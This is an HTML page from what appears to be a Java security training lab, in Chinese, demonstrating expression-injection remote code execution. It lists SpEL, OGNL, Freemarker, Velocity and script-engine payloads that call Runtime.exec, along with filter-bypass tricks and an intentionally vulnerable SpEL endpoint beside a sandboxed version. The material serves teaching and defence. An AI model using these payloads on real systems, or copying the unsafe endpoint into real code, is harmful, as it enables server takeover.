<!DOCTYPE html>
<html lang="zh-CN" xmlns:th="http://www.thymeleaf.org">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>表达式执行演示 - Java Security Lab</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/themes/prism.min.css" rel="stylesheet">
    <style>
        .vulnerability-demo { background-color: #fff3cd; border: 1px solid #ffeaa7; }
        .safe-demo { background-color: #d1ecf1; border: 1px solid #bee5eb; }
        .payload-box { background-color: #f8f9fa; border: 1px solid #dee2e6; font-family: monospace; }
        .result-box { min-height: 150px; border: 1px solid #dee2e6; padding: 10px; background-color: #f8f9fa; font-family: monospace; white-space: pre-wrap; }
        .expression-input { font-family: monospace; }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="/">Java Security Lab</a>
            <div class="navbar-nav ms-auto">
                <a class="nav-link" href="/rce">RCE主页</a>
                <a class="nav-link" href="/">返回首页</a>
            </div>
        </div>
    </nav>

    <div class="container mt-4">
        <div class="row">
            <div class="col-12">
                <h1 class="mb-4">表达式执行演示</h1>
                
                <!-- 说明部分 -->
                <div class="alert alert-info">
                    <h5><i class="fas fa-info-circle"></i> 表达式注入漏洞</h5>
                    <p>表达式注入是指攻击者能够在应用程序的表达式引擎中注入和执行恶意代码的漏洞。常见于模板引擎、表达式语言（EL）、脚本引擎等场景。</p>
                    <p><strong>常见技术：</strong> SpEL (Spring Expression Language)、OGNL、Freemarker、Velocity、JSP EL等</p>
                    <p><strong>危害：</strong> 远程代码执行、信息泄露、权限绕过、系统控制</p>
                </div>

                <!-- 表达式载荷 -->
                <div class="card mb-4">
                    <div class="card-header">
                        <h5>常见表达式注入载荷</h5>
                    </div>
                    <div class="card-body">
                        <div class="row">
                            <div class="col-md-6">
                                <h6>SpEL (Spring Expression Language)：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>#{T(java.lang.Runtime).getRuntime().exec('whoami')}</code>
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>#{T(java.lang.System).getProperty('user.name')}</code>
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}</code>
                                </div>
                                
                                <h6>OGNL (Object-Graph Navigation Language)：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>@java.lang.Runtime@getRuntime().exec('whoami')</code>
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>@java.lang.System@getProperty('user.name')</code>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <h6>JavaScript引擎：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>java.lang.Runtime.getRuntime().exec('whoami')</code>
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>new java.util.Scanner(java.lang.Runtime.getRuntime().exec('id').getInputStream()).next()</code>
                                </div>
                                
                                <h6>Freemarker模板：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt; ${ex("whoami")}</code>
                                </div>
                                
                                <h6>Velocity模板：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>#set($ex=$class.forName('java.lang.Runtime').getRuntime().exec('whoami'))</code>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- 演示区域 -->
                <div class="row">
                    <div class="col-md-6">
                        <div class="card vulnerability-demo mb-4">
                            <div class="card-header bg-warning">
                                <h5 class="mb-0"><i class="fas fa-exclamation-triangle"></i> 漏洞演示 - 直接表达式执行</h5>
                            </div>
                            <div class="card-body">
                                <p class="text-danger"><strong>危险：</strong> 直接执行用户输入的表达式</p>
                                
                                <form id="unsafeForm">
                                    <div class="mb-3">
                                        <label for="unsafeExpression" class="form-label">输入表达式：</label>
                                        <input type="text" class="form-control expression-input" id="unsafeExpression" 
                                               placeholder="例如: 2 + 3" value="2 + 3">
                                        <div class="form-text">支持SpEL、JavaScript等表达式</div>
                                    </div>
                                    <div class="mb-3">
                                        <label for="engineType" class="form-label">表达式引擎：</label>
                                        <select class="form-select" id="engineType">
                                            <option value="spel">SpEL (Spring Expression Language)</option>
                                            <option value="javascript">JavaScript引擎</option>
                                            <option value="groovy">Groovy引擎</option>
                                        </select>
                                    </div>
                                    <div class="mb-3">
                                        <button type="button" class="btn btn-danger" onclick="executeUnsafe()">
                                            <i class="fas fa-play"></i> 执行表达式（危险）
                                        </button>
                                        <button type="button" class="btn btn-outline-secondary btn-sm ms-2" onclick="clearUnsafeResult()">
                                            清除结果
                                        </button>
                                    </div>
                                </form>
                                
                                <div class="mb-3">
                                    <h6>快速测试：</h6>
                                    <div class="d-grid gap-2">
                                        <button class="btn btn-outline-danger btn-sm" onclick="setUnsafeExpression('2 + 3 * 4')">
                                            数学运算
                                        </button>
                                        <button class="btn btn-outline-danger btn-sm" onclick="setUnsafeExpression('T(java.lang.System).getProperty(\"user.name\")')">
                                            获取用户名
                                        </button>
                                        <button class="btn btn-outline-danger btn-sm" onclick="setUnsafeExpression('T(java.lang.Runtime).getRuntime().exec(\"whoami\")')">
                                            执行系统命令
                                        </button>
                                        <button class="btn btn-outline-danger btn-sm" onclick="setUnsafeExpression('new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"id\").getInputStream()).next()')">
                                            命令回显
                                        </button>
                                        <button class="btn btn-outline-danger btn-sm" onclick="setUnsafeExpression('T(java.lang.System).getProperties()')">
                                            系统属性
                                        </button>
                                    </div>
                                </div>
                                
                                <div class="mb-3">
                                    <h6>执行结果：</h6>
                                    <div id="unsafeResult" class="result-box">
                                        点击"执行表达式"查看结果...
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="col-md-6">
                        <div class="card safe-demo mb-4">
                            <div class="card-header bg-info text-white">
                                <h5 class="mb-0"><i class="fas fa-shield-alt"></i> 安全版本 - 表达式沙箱</h5>
                            </div>
                            <div class="card-body">
                                <p class="text-success"><strong>安全：</strong> 使用沙箱环境和表达式白名单</p>
                                
                                <form id="safeForm">
                                    <div class="mb-3">
                                        <label for="safeExpression" class="form-label">输入表达式：</label>
                                        <input type="text" class="form-control expression-input" id="safeExpression" 
                                               placeholder="只允许数学运算和简单函数" value="2 + 3">
                                        <div class="form-text">只允许安全的数学运算和字符串操作</div>
                                    </div>
                                    <div class="mb-3">
                                        <button type="button" class="btn btn-success" onclick="executeSafe()">
                                            <i class="fas fa-shield-alt"></i> 安全执行
                                        </button>
                                        <button type="button" class="btn btn-outline-secondary btn-sm ms-2" onclick="clearSafeResult()">
                                            清除结果
                                        </button>
                                    </div>
                                </form>
                                
                                <div class="mb-3">
                                    <h6>允许的操作：</h6>
                                    <div class="d-grid gap-2">
                                        <button class="btn btn-outline-success btn-sm" onclick="setSafeExpression('2 + 3 * 4')">
                                            数学运算
                                        </button>
                                        <button class="btn btn-outline-success btn-sm" onclick="setSafeExpression('\"Hello\".length()')">
                                            字符串长度
                                        </button>
                                        <button class="btn btn-outline-success btn-sm" onclick="setSafeExpression('\"HELLO\".toLowerCase()')">
                                            字符串转换
                                        </button>
                                        <button class="btn btn-outline-success btn-sm" onclick="setSafeExpression('Math.max(10, 20)')">
                                            数学函数
                                        </button>
                                        <button class="btn btn-outline-warning btn-sm" onclick="setSafeExpression('T(java.lang.Runtime).getRuntime()')">
                                            测试危险操作
                                        </button>
                                    </div>
                                </div>
                                
                                <div class="mb-3">
                                    <h6>执行结果：</h6>
                                    <div id="safeResult" class="result-box">
                                        点击"安全执行"查看结果...
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- 代码对比 -->
                <div class="card mb-4">
                    <div class="card-header">
                        <h5>代码实现对比</h5>
                    </div>
                    <div class="card-body">
                        <div class="row">
                            <div class="col-md-6">
                                <h6 class="text-danger">漏洞代码：</h6>
                                <pre><code class="language-java">// 危险：直接执行用户表达式
@PostMapping("/expression/unsafe")
public String executeUnsafe(@RequestParam String expression) {
    try {
        ExpressionParser parser = new SpelExpressionParser();
        Expression exp = parser.parseExpression(expression);
        
        // 直接执行，没有任何限制
        Object result = exp.getValue();
        return result != null ? result.toString() : "null";
    } catch (Exception e) {
        return "Error: " + e.getMessage();
    }
}</code></pre>
                            </div>
                            <div class="col-md-6">
                                <h6 class="text-success">安全代码：</h6>
                                <pre><code class="language-java">// 安全：使用沙箱和白名单
@PostMapping("/expression/safe")
public String executeSafe(@RequestParam String expression) {
    // 表达式白名单验证
    if (!isAllowedExpression(expression)) {
        return "Expression not allowed";
    }
    
    try {
        ExpressionParser parser = new SpelExpressionParser();
        Expression exp = parser.parseExpression(expression);
        
        // 使用受限的上下文
        StandardEvaluationContext context = new StandardEvaluationContext();
        context.setTypeLocator(new RestrictedTypeLocator());
        context.setMethodResolvers(Arrays.asList(new SafeMethodResolver()));
        
        Object result = exp.getValue(context);
        return result != null ? result.toString() : "null";
    } catch (Exception e) {
        return "Error: " + e.getMessage();
    }
}</code></pre>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- 绕过技巧 -->
                <div class="card mb-4">
                    <div class="card-header">
                        <h5>表达式注入绕过技巧</h5>
                    </div>
                    <div class="card-body">
                        <div class="row">
                            <div class="col-md-6">
                                <h6>SpEL绕过技巧：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>T(String).getClass().forName("java.lang.Runtime")</code>
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>new java.lang.ProcessBuilder({'calc'}).start()</code>
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>T(org.springframework.util.StreamUtils).copy(...)</code>
                                </div>
                                
                                <h6>反射绕过：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('calc')</code>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <h6>编码绕过：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>T(java.lang.Character).toString(99)+T(java.lang.Character).toString(97)+T(java.lang.Character).toString(108)+T(java.lang.Character).toString(99)</code>
                                </div>
                                
                                <h6>上下文绕过：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>#this.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')</code>
                                </div>
                                
                                <h6>构造器绕过：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>new java.io.BufferedReader(new java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream())).readLine()</code>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- 防护建议 -->
                <div class="alert alert-success">
                    <h5><i class="fas fa-shield-alt"></i> 表达式注入防护建议</h5>
                    <div class="row">
                        <div class="col-md-6">
                            <h6>输入验证：</h6>
                            <ul>
                                <li>表达式白名单验证</li>
                                <li>禁用危险类和方法</li>
                                <li>限制表达式复杂度</li>
                                <li>过滤特殊字符和关键字</li>
                            </ul>
                        </div>
                        <div class="col-md-6">
                            <h6>沙箱环境：</h6>
                            <ul>
                                <li>使用受限的执行上下文</li>
                                <li>自定义类型解析器</li>
                                <li>限制方法调用</li>
                                <li>设置执行超时</li>
                            </ul>
                        </div>
                    </div>
                </div>

                <!-- 检测方法 -->
                <div class="alert alert-warning">
                    <h5><i class="fas fa-search"></i> 表达式注入检测方法</h5>
                    <ul class="mb-0">
                        <li><strong>数学运算：</strong> 测试简单的数学表达式如 <code>7*7</code></li>
                        <li><strong>字符串操作：</strong> 测试字符串拼接和方法调用</li>
                        <li><strong>类型访问：</strong> 尝试访问Java类型如 <code>T(java.lang.String)</code></li>
                        <li><strong>方法调用：</strong> 尝试调用系统方法</li>
                        <li><strong>时间延迟：</strong> 使用 <code>Thread.sleep()</code> 检测执行</li>
                        <li><strong>DNS查询：</strong> 通过网络请求进行外带检测</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/plugins/autoloader/prism-autoloader.min.js"></script>
    
    <script>
        // 执行不安全的表达式
        function executeUnsafe() {
            const expression = document.getElementById('unsafeExpression').value;
            const engine = document.getElementById('engineType').value;
            
            if (!expression.trim()) {
                alert('请输入表达式');
                return;
            }
            
            const resultDiv = document.getElementById('unsafeResult');
            resultDiv.textContent = '执行中...';
            
            fetch('/rce/expression/unsafe', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `expression=${encodeURIComponent(expression)}&engine=${engine}`
            })
            .then(response => response.json())
            .then(data => {
                let result = `表达式: ${data.expression}\n`;
                result += `引擎: ${data.engine}\n`;
                result += `状态: ${data.success ? '成功' : '失败'}\n`;
                result += `执行时间: ${data.executionTime}ms\n\n`;
                
                if (data.result !== undefined) {
                    result += `结果:\n${data.result}\n`;
                }
                
                if (data.error) {
                    result += `错误:\n${data.error}`;
                }
                
                resultDiv.textContent = result;
            })
            .catch(error => {
                resultDiv.textContent = '请求失败: ' + error;
            });
        }
        
        // 执行安全的表达式
        function executeSafe() {
            const expression = document.getElementById('safeExpression').value;
            
            if (!expression.trim()) {
                alert('请输入表达式');
                return;
            }
            
            const resultDiv = document.getElementById('safeResult');
            resultDiv.textContent = '执行中...';
            
            fetch('/rce/expression/safe', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'expression=' + encodeURIComponent(expression)
            })
            .then(response => response.json())
            .then(data => {
                let result = `表达式: ${data.expression}\n`;
                result += `状态: ${data.success ? '成功' : '失败'}\n`;
                result += `验证: ${data.validation}\n`;
                result += `执行时间: ${data.executionTime}ms\n\n`;
                
                if (data.result !== undefined) {
                    result += `结果:\n${data.result}\n`;
                }
                
                if (data.error) {
                    result += `错误:\n${data.error}`;
                }
                
                resultDiv.textContent = result;
            })
            .catch(error => {
                resultDiv.textContent = '请求失败: ' + error;
            });
        }
        
        // 设置不安全表达式
        function setUnsafeExpression(expression) {
            document.getElementById('unsafeExpression').value = expression;
        }
        
        // 设置安全表达式
        function setSafeExpression(expression) {
            document.getElementById('safeExpression').value = expression;
        }
        
        // 清除结果
        function clearUnsafeResult() {
            document.getElementById('unsafeResult').textContent = '点击"执行表达式"查看结果...';
        }
        
        function clearSafeResult() {
            document.getElementById('safeResult').textContent = '点击"安全执行"查看结果...';
        }
        
        // 回车键执行
        document.getElementById('unsafeExpression').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                executeUnsafe();
            }
        });
        
        document.getElementById('safeExpression').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                executeSafe();
            }
        });
    </script>
</body>
</html>